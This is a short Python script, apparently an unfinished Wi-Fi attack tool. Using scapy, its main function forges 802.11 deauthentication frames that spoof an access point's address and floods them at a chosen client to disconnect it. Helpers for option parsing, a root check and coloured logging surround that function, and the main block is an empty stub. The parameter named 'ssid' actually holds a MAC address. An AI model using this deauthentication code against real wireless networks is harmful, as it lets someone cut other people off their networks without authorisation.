#! /usr/bin/env python3

from os import geteuid
from scapy.all import *
from datetime import date
from optparse import OptionParser
from colorama import Fore, Back, Style
from time import strftime, localtime

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

def check_root():
    return geteuid() == 0

def sendDeauthenticationFrame(ssid, client, iface, count, interval):
    dot11 = Dot11(type=0, subtype=12, addr1=client, addr2=ssid, addr3=ssid)
    deauthentication_layer = Dot11Deauth(reason=7)
    packet = RadioTap() / dot11 / deauthentication_layer
    sendp(packet, iface=iface, count=count, inter=interval, verbose=True)

if __name__ == "__main__":
    pass